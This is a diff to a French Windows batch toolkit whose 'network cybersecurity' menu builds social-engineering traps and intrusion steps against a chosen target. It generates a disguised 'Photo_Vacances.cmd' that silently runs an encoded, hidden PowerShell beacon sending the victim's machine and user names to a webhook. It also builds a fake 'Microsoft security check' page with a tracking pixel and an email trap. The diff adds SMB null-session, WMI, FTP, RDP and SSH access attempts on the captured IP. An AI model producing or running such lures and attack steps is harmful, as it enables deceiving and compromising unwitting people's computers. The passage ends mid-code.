@@ -157,7 +157,7 @@ set "t[66]=net_restart_adapters:Redemarrer les cartes reseau~Ethernet et Wi-Fi:H
 set "t[67]=net_fast_reset:Script d'Urgence Reseau~7 commandes de depannage:HIDDEN"
 set "t[68]=cyber_triage:Triage de Connectivite~Diagnostic rapide IP, Gateway et DNS:HIDDEN"
 set "t[69]=cyber_adapter_audit:Audit des Adaptateurs Reseau~Infos MAC, vitesse et statut:HIDDEN"
-set "t[70]=cyber_lan_scan:Scanner LAN~Redirige vers l'Assistant Scanner Distant:HIDDEN"
+set "t[70]=cyber_lan_auto:Scanner le Reseau Local (LAN)~Detecte les appareils connectes et leurs failles:HIDDEN"
 set "t[71]=cyber_flux_analysis:Analyse des Flux Reseau~Ports ouverts et processus actifs:HIDDEN"
 set "t[72]=cyber_dns_leak:Test de Fuite DNS~Verifier l'anonymat DNS avec VPN:HIDDEN"
 set "t[73]=cyber_ip_grabber:Assistant Scanner Distant~Trouver l'IP et analyser la cible:HIDDEN"
@@ -336,9 +336,9 @@ set "map_um_del=Supprimer un utilisateur~Effacer compte et donnees"
 set "map_um_admin=Gerer les droits~Passer standard ou administrateur"
 set "map_um_reset=Ajouter/Modifier MDP~Changer mot de passe utilisateur"
 set "map_um_remove_pwd=Supprimer le MDP (Auto-login)~Enlever le mot de passe"
-set "map_cyber_triage=Triage de Connectivite~Diagnostic rapide IP, Gateway et DNS"
-set "map_cyber_adapter_audit=Audit des Adaptateurs Reseau~Infos MAC, vitesse et statut"
-set "map_cyber_lan_scan=Scanner de Failles Reseau~LAN, vulnerabilites et connexion distante"
+set "map_cyber_triage=Diagnostic PC et Connectivite~Analyse IP, Cartes reseau (MAC), DNS et Gateway"
+
+set "map_cyber_lan_auto=Scanner Reseau Local (LAN)~Scan des adresses locales pour detecter les appareils connectes"
 set "map_cyber_flux_analysis=Analyse des Flux Reseau~Ports ouverts et processus actifs"
 set "map_cyber_dns_leak=Test de Fuite DNS~Verifier l'anonymat DNS avec VPN"
 set "map_cyber_ip_grabber=Assistant Scanner Distant~Trouver l'IP et analyser la cible"
@@ -1592,20 +1592,20 @@ REM ===================================================================
 REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 :net_cyber_menu
-call :AutoMenu "CYBERSECURITE RESEAU" "cyber_triage;cyber_adapter_audit;cyber_flux_analysis;cyber_dns_leak;cyber_wifi_audit;cyber_ip_grabber"
+call :AutoMenu "CYBERSECURITE RESEAU" "cyber_triage;cyber_flux_analysis;cyber_dns_leak;cyber_wifi_audit;cyber_ip_grabber;cyber_lan_auto"
 if "%errorlevel%"=="0" goto system_tools
 goto !AutoMenu_Target!
 
 REM ===================================================================
 :cyber_ip_grabber
 REM   ASSISTANT SCANNER DISTANT - IP Grabber + Scanner fusionnes
-set "opts=J'ai deja l'IP ou le DNS de la cible;Je n'ai pas l'IP - Utiliser un piege;Scanner mon reseau local (LAN automatique)"
+set "opts=J'ai deja l'IP ou le DNS de la cible;Je n'ai pas l'IP - Creer un piege"
 call :DynamicMenu "AVEZ-VOUS L'IP DE LA CIBLE ?" "%opts%" "NONUMS"
 set "ds_ch=%errorlevel%"
 if "%ds_ch%"=="0" goto net_cyber_menu
 if "%ds_ch%"=="1" goto ds_saisir_ip
-if "%ds_ch%"=="3" goto cyber_lan_direct
-goto cyber_grabber_methods
+if "%ds_ch%"=="2" goto gm_traps_menu
+goto cyber_ip_grabber
 
 :ds_saisir_ip
 cls
@@ -1616,7 +1616,7 @@ echo  ================================================
 echo.
 echo  Exemples :
 echo   - IP publique WAN  : 82.xx.xx.xx
-echo   - DDNS             : cousin.duckdns.org
+echo   - DDNS             : cible.duckdns.org
 echo   - Tailscale        : nom-pc.tailXXXX.ts.net
 echo.
 call :InputWithEsc "IP ou DNS de la cible : " remote_ip
@@ -1660,88 +1660,18 @@ goto wan_public_scan
 set "base_ip=AUTO"
 goto start_lan_scan
 
-:cyber_grabber_methods
-REM --- Question DDNS ---
-set "ddns_q=Oui - DuckDNS NoIP Tailscale ou nom de domaine configure~Resolution directe du nom en IP;Non ou je ne sais pas - Voir les methodes disponibles~Pieges CMD HTML Email ou saisie manuelle"
-call :DynamicMenu "LE PC CIBLE A-T-IL UN DDNS OU NOM DE DOMAINE ?" "%ddns_q%" "NONUMS"
-set "ddns_ch=%errorlevel%"
-if "%ddns_ch%"=="0" goto cyber_ip_grabber
-if "%ddns_ch%"=="1" goto gm_dns_resolve
-if "%ddns_ch%"=="2" goto gm_traps_menu
-
-goto cyber_grabber_methods
-
 :gm_traps_menu
-set "trap_q=DNS - Resoudre son nom DDNS Tailscale DuckDNS~Si votre cible a un DDNS ou nom configure;PIEGE CMD - Fichier .cmd piege - votre cousin double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - votre cousin ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE EMAIL - Son IP vous est envoyee par email~Votre cousin clique un lien dans le mail;MANUEL - Votre cousin vous communique son IP~Il tape ipconfig dans CMD et vous envoie son adresse"
+set "trap_q=PIEGE CMD - Fichier .cmd piege - la cible double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - la cible ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE EMAIL - Son IP vous est envoyee par email~La cible clique un lien dans le mail"
 call :DynamicMenu "CHOISIR UN PIEGE POUR CAPTURER SON IP" "%trap_q%" "NONUMS"
 set "gm_ch=%errorlevel%"
-if "%gm_ch%"=="0" goto cyber_grabber_methods
-if "%gm_ch%"=="1" goto gm_dns_resolve
-if "%gm_ch%"=="2" goto gm_webhook_trap
-if "%gm_ch%"=="3" goto gm_pixel_html
-if "%gm_ch%"=="4" goto gm_email_trap
+if "%gm_ch%"=="0" goto cyber_ip_grabber
+if "%gm_ch%"=="1" goto gm_webhook_trap
+if "%gm_ch%"=="2" goto gm_pixel_html
+if "%gm_ch%"=="3" goto gm_email_trap
+goto gm_traps_menu
 if "%gm_ch%"=="5" goto gm_manual_ip
 goto gm_traps_menu
 
-:gm_all_methods
-set "all_q=DNS - Resoudre son nom DDNS Tailscale DuckDNS~Resolution du nom en IP publique directement;PIEGE CMD - Fichier .cmd piege - votre cousin clique~Photo_Vacances.cmd via webhook.site;PIXEL HTML - Page web piege - votre cousin ouvre un lien~IP captee a l ouverture aucun clic suspect;PIEGE EMAIL - Son IP vous est envoyee par email~Utilise FormSubmit aucun compte requis;MANUEL - Votre cousin vous communique son IP~Il tape ipconfig dans CMD"
-call :DynamicMenu "TOUTES LES METHODES D OBTENTION D IP" "%all_q%" "NONUMS"
-set "gm_ch=%errorlevel%"
-if "%gm_ch%"=="0" goto cyber_grabber_methods
-if "%gm_ch%"=="1" goto gm_dns_resolve
-if "%gm_ch%"=="2" goto gm_webhook_trap
-if "%gm_ch%"=="3" goto gm_pixel_html
-if "%gm_ch%"=="4" goto gm_email_trap
-if "%gm_ch%"=="5" goto gm_manual_ip
-goto gm_all_methods
-
-:gm_dns_resolve
-cls
-echo.
-echo  ================================================
-echo   [DNS] RESOLUTION PAR NOM / DDNS
-echo  ================================================
-echo.
-echo  Utilisez cette methode si vous connaissez :
-echo   - Nom NetBIOS du PC   ex: DESKTOP-ABCDEF
-echo   - DDNS                ex: cousin.duckdns.org
-echo   - Tailscale           ex: pc-cousin.tailXXXX.ts.net
-echo.
-call :InputWithEsc "Nom du PC ou DDNS : " ds_hostname
-if errorlevel 1 goto cyber_grabber_methods
-if not defined ds_hostname goto cyber_grabber_methods
-echo.
-echo  [>] Resolution de !ds_hostname! en cours...
-set "DS_PS=%TEMP%\dns_res_%RANDOM%.ps1"
->> "%DS_PS%" echo $h = '!ds_hostname!'
->> "%DS_PS%" echo try {
->> "%DS_PS%" echo   $a = [System.Net.Dns]::GetHostAddresses($h) ^| Where-Object { $_.AddressFamily -eq 'InterNetwork' }
->> "%DS_PS%" echo   if ($a) {
->> "%DS_PS%" echo     $ip = ($a ^| Select-Object -First 1).IPAddressToString
->> "%DS_PS%" echo     Write-Host "  [OK] IP resolue : $ip" -f Green
->> "%DS_PS%" echo     $ip ^| Set-Content "$env:TEMP\resolved_ip.txt" -Encoding ASCII
->> "%DS_PS%" echo   } else { Write-Host '  [!] Aucune IPv4 trouvee' -f Yellow }
->> "%DS_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
-powershell -NoProfile -ExecutionPolicy Bypass -File "%DS_PS%"
-del /f /q "%DS_PS%" 2>nul
-if exist "%TEMP%\resolved_ip.txt" (
-    set /p remote_ip=<"%TEMP%\resolved_ip.txt"
-    del /f /q "%TEMP%\resolved_ip.txt"
-    if defined remote_ip (
-        set "remote_pc=!ds_hostname!"
-        set "remote_port=NONE"
-        echo.
-        echo  [-^>] IP : !remote_ip! --- Lancement du scan dans 2s...
-        timeout /t 2 >nul
-        goto wan_public_scan
-    )
-)
-echo.
-echo  [!] Echec. Essayez une autre methode.
-pause >nul
-goto cyber_grabber_methods
-
-REM --- [2] Piege CMD Webhook ---
 :gm_webhook_trap
 cls
 echo.
@@ -1750,7 +1680,7 @@ echo   [PIEGE CMD] LIEN WEBHOOK.SITE
 echo  ================================================
 echo.
 echo  [i] Un fichier Photo_Vacances.cmd sera cree sur votre Bureau.
-echo      Envoyez-le a votre cousin (Discord, email, cle USB...).
+echo      Envoyez-le a votre cible (Discord, email, cle USB...).
 echo      Quand il double-clique, son IP arrive ici et le scan
 echo      se lance automatiquement.
 echo.
@@ -1767,18 +1697,14 @@ set "PS_WH=%TEMP%\ig_wh_%RANDOM%.ps1"
 >> "%PS_WH%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
 >> "%PS_WH%" echo $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + `$env:COMPUTERNAME + '/' + `$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
 >> "%PS_WH%" echo $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
->> "%PS_WH%" echo $cmd = "@echo off`
-`
-start /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`
-`
-exit"
+>> "%PS_WH%" echo $cmd = "@echo off`r`nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`r`nexit"
 >> "%PS_WH%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
 >> "%PS_WH%" echo Write-Host ''
 >> "%PS_WH%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd sur le Bureau' -f Green
->> "%PS_WH%" echo Write-Host '  [i] Envoyez ce fichier a votre cousin et attendez...' -f Cyan
+>> "%PS_WH%" echo Write-Host '  [i] Envoyez ce fichier a votre cible et attendez...' -f Cyan
 >> "%PS_WH%" echo Write-Host '  [i] En attente (ECHAP pour annuler)' -f DarkYellow
 >> "%PS_WH%" echo Write-Host ''
->> "%PS_WH%" echo $sp = @('|','/','-','\'); $si = 0; $esc = $false; $found = $false
+>> "%PS_WH%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
 >> "%PS_WH%" echo while (-not $esc -and -not $found) {
 >> "%PS_WH%" echo   if ($Host.UI.RawUI.KeyAvailable) {
 >> "%PS_WH%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
@@ -1804,8 +1730,7 @@ exit"
 >> "%PS_WH%" echo   if (-not $found) {
 >> "%PS_WH%" echo     $i = 3
 >> "%PS_WH%" echo     while ($i -gt 0) {
->> "%PS_WH%" echo       [Console]::Write("`
-  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
+>> "%PS_WH%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
 >> "%PS_WH%" echo       $si++; $i--; Start-Sleep -Milliseconds 1000
 >> "%PS_WH%" echo       if ($Host.UI.RawUI.KeyAvailable) {
 >> "%PS_WH%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
@@ -1837,7 +1762,7 @@ if exist "%TEMP%\captured_ip.txt" (
         goto wan_public_scan
     )
 )
-goto cyber_grabber_methods
+goto gm_traps_menu
 
 REM --- [3] Pixel HTML Tracker ---
 :gm_pixel_html
@@ -1847,7 +1772,7 @@ echo  ================================================
 echo   [HTML] PIXEL TRACKER NAVIGATEUR
 echo  ================================================
 echo.
-echo  [i] Genere une page HTML a envoyer a votre cousin.
+echo  [i] Genere une page HTML a envoyer a votre cible.
 echo      Il lui suffit de l'ouvrir dans Chrome ou Firefox.
 echo      Aucun double-clic ni execution requise.
 echo      Son IP est captee des l'ouverture de la page.
@@ -1865,11 +1790,11 @@ set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
 >> "%PS_HTML%" echo   $html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Verification Microsoft</title><style>body{font-family:Segoe UI,sans-serif;text-align:center;padding:80px;background:#f3f3f3}h2{color:#0078d4}.ld{border:4px solid #ddd;border-top:4px solid #0078d4;border-radius:50%;width:36px;height:36px;animation:sp 1s linear infinite;margin:20px auto}@keyframes sp{to{transform:rotate(360deg)}}</style></head><body><img src='$url' width='1' height='1' style='display:none'><div class='ld'></div><h2>Verification de securite</h2><p>Une analyse est en cours sur votre appareil.<br>Veuillez patienter sans fermer cette fenetre.</p><script>try{fetch('$url/'+navigator.platform+'/'+screen.width+'x'+screen.height);}catch(e){}</script></body></html>"
 >> "%PS_HTML%" echo   Set-Content -Path $desk -Value $html -Encoding UTF8
 >> "%PS_HTML%" echo   Write-Host '  [OK] Page HTML generee : Verification_Microsoft.html' -f Green
->> "%PS_HTML%" echo   Write-Host '  [i] Envoyez ce fichier a votre cousin (Discord, email...)' -f Cyan
+>> "%PS_HTML%" echo   Write-Host '  [i] Envoyez ce fichier a votre cible (Discord, email...)' -f Cyan
 >> "%PS_HTML%" echo   Write-Host '  [i] Il suffit qu''il l''ouvre dans son navigateur' -f Cyan
 >> "%PS_HTML%" echo   Write-Host '  [i] En attente... (ECHAP pour annuler)' -f DarkYellow
 >> "%PS_HTML%" echo   Write-Host ''
->> "%PS_HTML%" echo   $sp = @('|','/','-','\'); $si = 0; $esc = $false; $found = $false
+>> "%PS_HTML%" echo   $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
 >> "%PS_HTML%" echo   while (-not $esc -and -not $found) {
 >> "%PS_HTML%" echo     if ($Host.UI.RawUI.KeyAvailable) {
 >> "%PS_HTML%" echo       if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
@@ -1891,8 +1816,7 @@ set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
 >> "%PS_HTML%" echo     if (-not $found) {
 >> "%PS_HTML%" echo       $i = 3
 >> "%PS_HTML%" echo       while ($i -gt 0) {
->> "%PS_HTML%" echo         [Console]::Write("`
-  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
+>> "%PS_HTML%" echo         [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
 >> "%PS_HTML%" echo         $si++; $i--; Start-Sleep -Milliseconds 1000
 >> "%PS_HTML%" echo         if ($Host.UI.RawUI.KeyAvailable) {
 >> "%PS_HTML%" echo           if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
@@ -1917,7 +1841,7 @@ chcp 65001 >nul
         goto wan_public_scan
     )
 )
-goto cyber_grabber_methods
+goto gm_traps_menu
 
 REM --- [4] Email Trap ---
 :gm_email_trap
@@ -1928,15 +1852,15 @@ echo   [EMAIL] PIEGE PAR E-MAIL
 echo  ================================================
 echo.
 echo  [i] Genere un fichier Photo_Vacances.cmd sur le Bureau.
-echo      Quand votre cousin l'execute, vous recevez un email
+echo      Quand votre cible l'execute, vous recevez un email
 echo      avec son IP, nom de machine et session.
 echo.
 echo  [!] 1er envoi : confirmez d'abord l'adresse dans le
 echo      mail de validation de FormSubmit.
 echo.
 call :InputWithEsc "Votre e-mail de reception : " grab_email
-if errorlevel 1 goto cyber_grabber_methods
-if not defined grab_email goto cyber_grabber_methods
+if errorlevel 1 goto gm_traps_menu
+if not defined grab_email goto gm_traps_menu
 set "PS_EM=%TEMP%\ig_em_%RANDOM%.ps1"
 set "gemail=!grab_email!"
 >> "%PS_EM%" echo $cmdPath = "$env:USERPROFILE\Desktop\Photo_Vacances.cmd"
@@ -1958,65 +1882,9 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_EM%"
 if exist "%PS_EM%" del /f /q "%PS_EM%"
 echo.
 pause >nul
-goto cyber_grabber_methods
+goto gm_traps_menu
 
 REM --- [5] Saisie Manuelle ---
-:gm_manual_ip
-cls
-echo.
-echo  ================================================
-echo   SAISIR L'IP PUBLIQUE DE LA CIBLE
-echo  ================================================
-echo.
-echo  La cible doit aller sur %Y%https://monip.org%N% (ou ifconfig.me)
-echo  et vous communiquer l'adresse IP affichee.
-echo.
-echo  %G%Exemples :%N%
-echo   - IP publique   : 82.xx.xx.xx
-echo   - IPv6 possible : 2a01:xxxx:xxxx:xxxx::1
-echo.
-echo  %Y%[i]%N% Si la cible utilise un VPN ou Tailscale, elle peut
-echo      vous donner directement son IP Tailscale (100.x.x.x).
-echo.
-call :InputWithEsc "IP publique de la cible : " remote_ip
-
-if errorlevel 1 goto cyber_grabber_methods
-if not defined remote_ip goto cyber_grabber_methods
-REM --- Validation IP / Hostname ---
-set "VALPS=%TEMP%\val_%RANDOM%.ps1"
->>  "%VALPS%" echo $in = [System.Environment]::GetEnvironmentVariable("remote_ip")
->>  "%VALPS%" echo if (-not $in) { exit 1 }
->>  "%VALPS%" echo $resolved = $null
->>  "%VALPS%" echo if ($in -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$") {
->>  "%VALPS%" echo     $parts = $in.Split(".")
->>  "%VALPS%" echo     $ok = ($parts ^| Where-Object { [int]$_ -gt 255 }).Count -eq 0
->>  "%VALPS%" echo     if ($ok) { $resolved = $in }
->>  "%VALPS%" echo } else {
->>  "%VALPS%" echo     try { $a = [System.Net.Dns]::GetHostAddresses($in) ^| Where-Object { $_.AddressFamily -eq "InterNetwork" } ^| Select-Object -First 1; if ($a) { $resolved = $a.IPAddressToString } } catch {}
->>  "%VALPS%" echo }
->>  "%VALPS%" echo if (-not $resolved) { Write-Host "  [!] Adresse invalide (verifiez l IP)." -ForegroundColor Red; exit 1 }
->>  "%VALPS%" echo Write-Host ("  [OK] IP validee : " + $resolved) -ForegroundColor Green
->>  "%VALPS%" echo $resolved ^| Set-Content "$env:TEMP\val_result.txt" -Encoding ASCII
-powershell -NoProfile -ExecutionPolicy Bypass -File "%VALPS%"
-set "val_err=%errorlevel%"
-if exist "%VALPS%" del /f /q "%VALPS%"
-if "%val_err%"=="1" (
-    echo.
-    echo  %R%[!] Saisie invalide. Veuillez entrer une IP valide.%N%
-    timeout /t 2 >nul
-    goto gm_manual_ip
-)
-if exist "%TEMP%\val_result.txt" (
-    set /p remote_ip=<"%TEMP%\val_result.txt"
-    del /f /q "%TEMP%\val_result.txt"
-)
-set "remote_pc="
-set "remote_port=NONE"
-echo.
-echo  [-^>] IP enregistree : !remote_ip!
-echo  [-^>] Lancement du scan dans 2 secondes...
-timeout /t 2 >nul
-goto wan_public_scan
 :cyber_triage
 cls
 echo.
@@ -2031,19 +1899,12 @@ powershell -NoProfile -Command "$gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0'
 echo   [>] 3. Verification des serveurs DNS...
 powershell -NoProfile -Command "$dns=(Get-DnsClientServerAddress).ServerAddresses | Select-Object -Unique; if($dns){Write-Host '      [OK] DNS actifs :' ($dns -join ', ') -f Green} else {Write-Host '      [ECHEC] Pas de DNS !' -f Red}"
 echo.
+echo. 
+echo   [>] 4. Cartes reseau physiques (Hardware)...
+powershell -NoProfile -Command "Write-Host ' NOM             | STATUT       | VITESSE      | ADRESSE MAC' -f White; Write-Host ' ---------------|--------------|--------------|-------------------' -f Gray; Get-NetAdapter -EA SilentlyContinue | Where-Object {$_.Status -ne 'Not Present'} | ForEach-Object { $s = switch($_.Status){'Up'{'Actif'};'Down'{'Inactif'};'Disconnected'{'Deconnecte'};default{$_.Status}}; Write-Host (' {0,-15} | {1,-12} | {2,-12} | {3}' -f $_.Name, $s, $_.LinkSpeed, $_.MacAddress) -f Gray }"
 pause
 goto net_cyber_menu
 
-:cyber_adapter_audit
-cls
-echo.
-echo  ================================================
-echo   AUDIT DES ADAPTATEURS RESEAU
-echo  ================================================
-powershell -NoProfile -Command "Write-Host ' NOM             | STATUT       | VITESSE      | ADRESSE MAC' -f White; Write-Host ' ---------------|--------------|--------------|-------------------' -f Gray; Get-NetAdapter -EA SilentlyContinue | Where-Object {$_.Status -ne 'Not Present'} | ForEach-Object { $s = switch($_.Status){'Up'{'Actif'};'Down'{'Inactif'};'Disconnected'{'Deconnecte'};default{$_.Status}}; Write-Host (' ' + $_.Name.PadRight(15) + ' | ' + $s.PadRight(12) + ' | ' + $_.LinkSpeed.ToString().PadRight(12) + ' | ' + $_.MacAddress) -f Gray }"
-echo.
-pause
-goto net_cyber_menu
 
 :cyber_flux_analysis
 cls
@@ -2486,7 +2347,7 @@ echo  - Reseau local :          192.168.1   (scanne .1 a .254)
 echo  - IP unique :             192.168.1.50
 echo  - Reseau box distante :   192.168.1 ou 10.0.0 (adresse PRIVEE de sa box)
 echo.
-echo  [!] L'IP publique WAN de votre cousin (type IPv6 ou 82.x.x.x)
+echo  [!] L'IP publique WAN de votre cible (type IPv6 ou 82.x.x.x)
 echo      ne scanne PAS les appareils de son reseau local.
 echo      Utilisez le module IP GRABBER pour obtenir son IP, puis
 echo      connectez-vous en SSH ou WinRM pour un scan interne reel.
@@ -2598,7 +2459,9 @@ echo  %Y%[i]%N% Appuyez sur ECHAP pour annuler.
 echo.
 
 set "WANS=%TEMP%\wan_scan_%RANDOM%.ps1"
+set "WPORTS=%TEMP%\wan_ports_result.txt"
 if exist "%WANS%" del /f /q "%WANS%"
+if exist "%WPORTS%" del /f /q "%WPORTS%"
 
 >>  "%WANS%" echo $ip = "!remote_ip!"
 >>  "%WANS%" echo $wanPorts = @(
@@ -2636,7 +2499,8 @@ if exist "%WANS%" del /f /q "%WANS%"
 >>  "%WANS%" echo     if ($Host.UI.RawUI.KeyAvailable) { if ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 27) { $esc=$true } }
 >>  "%WANS%" echo     if ($esc) { break }
 >>  "%WANS%" echo     [Console]::Write("`r  [*] Test port $($e.P) ($($e.N))...    ")
->>  "%WANS%" echo     $tcp = New-Object System.Net.Sockets.TcpClient
+>>  "%WANS%" echo     $ipObj = [System.Net.IPAddress]::Parse($ip)
+>>  "%WANS%" echo     $tcp = New-Object System.Net.Sockets.TcpClient($ipObj.AddressFamily)
 >>  "%WANS%" echo     try {
 >>  "%WANS%" echo         $c = $tcp.BeginConnect($ip, $e.P, $null, $null)
 >>  "%WANS%" echo         if ($c.AsyncWaitHandle.WaitOne(800, $false) -and $tcp.Connected) {
@@ -2651,30 +2515,33 @@ if exist "%WANS%" del /f /q "%WANS%"
 >>  "%WANS%" echo if ($found.Count -eq 0) {
 >>  "%WANS%" echo     Write-Host "  [OK] Aucun port critique expose depuis internet." -f Green
 >>  "%WANS%" echo     Write-Host "  [i] La box bloque tout. Utilisez un piege pour penetrer le LAN interne." -f Yellow
->>  "%WANS%" echo     Set-Content "$env:TEMP\wan_open_ports.txt" "" -Encoding ASCII
+>>  "%WANS%" echo     Set-Content "%WPORTS%" "NONE" -Encoding ASCII
 >>  "%WANS%" echo } else {
 >>  "%WANS%" echo     Write-Host "  [$($found.Count) service(s) expose(s) detecte(s) - Exfiltration possible !]" -f Red
->>  "%WANS%" echo     $found ^| ForEach-Object { "$($_.P)^|$($_.N)^|$($_.R)" } ^| Set-Content "$env:TEMP\wan_open_ports.txt" -Encoding ASCII
+>>  "%WANS%" echo     Set-Content "%WPORTS%" (($found ^| ForEach-Object { [string]$_.P }) -join ",") -Encoding ASCII
 >>  "%WANS%" echo }
 
 powershell -NoProfile -ExecutionPolicy Bypass -File "%WANS%"
 if exist "%WANS%" del /f /q "%WANS%"
+set "found_ports="
+set /p found_ports=<"%WPORTS%"
+if exist "%WPORTS%" del /f /q "%WPORTS%"
 
 echo.
+if "!found_ports!"=="NONE" goto cyber_ip_grabber
+if not defined found_ports goto cyber_ip_grabber
+
 set "fwd_opts=Retour"
 set "fwd_actions=retour"
+set "fp=,!found_ports!,"
 
-findstr /C:"3389|" "%TEMP%\wan_open_ports.txt" >nul 2>&1
-if %errorlevel%==0 (set "fwd_opts=Tenter connexion RDP (Bureau a distance) sur port 3389;!fwd_opts!" ^& set "fwd_actions=rdp,!fwd_actions!")
-
-findstr /C:"22|" "%TEMP%\wan_open_ports.txt" >nul 2>&1
-if %errorlevel%==0 (set "fwd_opts=Tenter connexion SSH sur port 22;!fwd_opts!" ^& set "fwd_actions=ssh,!fwd_actions!")
-
-findstr /C:"5985|" "%TEMP%\wan_open_ports.txt" >nul 2>&1
-if %errorlevel%==0 (set "fwd_opts=Ouvrir session PowerShell distante (WinRM) sur port 5985;!fwd_opts!" ^& set "fwd_actions=winrm,!fwd_actions!")
-
-findstr /R /C:"445|" /C:"139|" "%TEMP%\wan_open_ports.txt" >nul 2>&1
-if %errorlevel%==0 (set "fwd_opts=Explorer partages secrets SMB (C$, Admin$);!fwd_opts!" ^& set "fwd_actions=smb,!fwd_actions!")
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=Explorer partages SMB (C$, Admin$, partages);!fwd_opts!" & set "fwd_actions=smb,!fwd_actions!"
+if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Test session anonyme - Null Session;!fwd_opts!" & set "fwd_actions=smb_null,!fwd_actions!"
+if not "!fp:,135,=!"=="!fp!" set "fwd_opts=[RPC] Enumerer endpoints DCOM/WMI (port 135);!fwd_opts!" & set "fwd_actions=rpc_enum,!fwd_actions!"
+if not "!fp:,21,=!"=="!fp!" set "fwd_opts=[FTP] Test login anonyme (port 21);!fwd_opts!" & set "fwd_actions=ftp_anon,!fwd_actions!"
+if not "!fp:,5985,=!"=="!fp!" set "fwd_opts=[WinRM] Session PowerShell distante (port 5985);!fwd_opts!" & set "fwd_actions=winrm,!fwd_actions!"
+if not "!fp:,22,=!"=="!fp!" set "fwd_opts=[SSH] Connexion terminal SSH (port 22);!fwd_opts!" & set "fwd_actions=ssh,!fwd_actions!"
+if not "!fp:,3389,=!"=="!fp!" set "fwd_opts=[RDP] Bureau a distance - mstsc (port 3389);!fwd_opts!" & set "fwd_actions=rdp,!fwd_actions!"
 
 call :DynamicMenu "QUE FAIRE AVEC CETTE CIBLE ?" "!fwd_opts!" "NONUMS NOCLS"
 set "fwd_ch=%errorlevel%"
@@ -2713,6 +2580,88 @@ if "!sel_action!"=="winrm" (
 )
 if "!sel_action!"=="smb" goto smb_explore
 if "!sel_action!"=="retour" goto cyber_ip_grabber
+
+if "!sel_action!"=="smb_null" (
+    cls
+    echo.
+    echo %B%  [SMB] TEST SESSION ANONYME - NULL SESSION%N%
+    echo  Cible : !remote_ip!
+    echo.
+    echo  [*] Tentative connexion IPC$ sans credentials...
+    net use \\!remote_ip!\IPC$ "" /user:"" 2>&1
+    if errorlevel 1 (
+        echo.
+        echo %R%  [-] Null session refusee - SMB correctement protege.%N%
+    ) else (
+        echo.
+        echo %G%  [+] NULL SESSION ACCEPTEE ^! Enumeration des partages :%N%
+        net view \\!remote_ip! 2>&1
+        echo.
+        echo  [*] Deconnexion...
+        net use \\!remote_ip!\IPC$ /delete >nul 2>&1
+    )
+    echo.
+    pause
+    goto wan_public_scan
+)
+
+if "!sel_action!"=="rpc_enum" (
+    cls
+    echo.
+    echo %B%  [RPC] ENUMERATION ENDPOINTS DCOM/WMI%N%
+    echo  Cible : !remote_ip!
+    echo.
+    set "RPC_TMP=%TEMP%\rpc_enum_%RANDOM%.ps1"
+    >> "!RPC_TMP!" echo $ip = "!remote_ip!"
+    >> "!RPC_TMP!" echo Write-Host "  [*] Tentative connexion WMI distante (credentials requis)..." -f Yellow
+    >> "!RPC_TMP!" echo try {
+    >> "!RPC_TMP!" echo     $cred = Get-Credential -Message "Identifiants de la cible !remote_ip!"
+    >> "!RPC_TMP!" echo     $opt = New-CimSessionOption -Protocol Dcom
+    >> "!RPC_TMP!" echo     $sess = New-CimSession -ComputerName $ip -Credential $cred -SessionOption $opt -EA Stop
+    >> "!RPC_TMP!" echo     $sys = Get-CimInstance Win32_ComputerSystem -CimSession $sess
+    >> "!RPC_TMP!" echo     Write-Host "  [+] ACCES WMI OK !" -f Green
+    >> "!RPC_TMP!" echo     Write-Host "  Nom     : $($sys.Name)" -f Cyan
+    >> "!RPC_TMP!" echo     Write-Host "  Domaine : $($sys.Domain)" -f Cyan
+    >> "!RPC_TMP!" echo     Write-Host "  OS      : $($sys.Caption)" -f Cyan
+    >> "!RPC_TMP!" echo     Write-Host "" ; Write-Host "  [*] Processus en cours :" -f Yellow
+    >> "!RPC_TMP!" echo     Get-CimInstance Win32_Process -CimSession $sess ^| Select Name,ProcessId,@{N='Mem(MB)';E={[math]::Round($_.WorkingSetSize/1MB,1)}} ^| Sort Mem -Desc ^| Select -First 15 ^| Format-Table -Auto
+    >> "!RPC_TMP!" echo     Remove-CimSession $sess
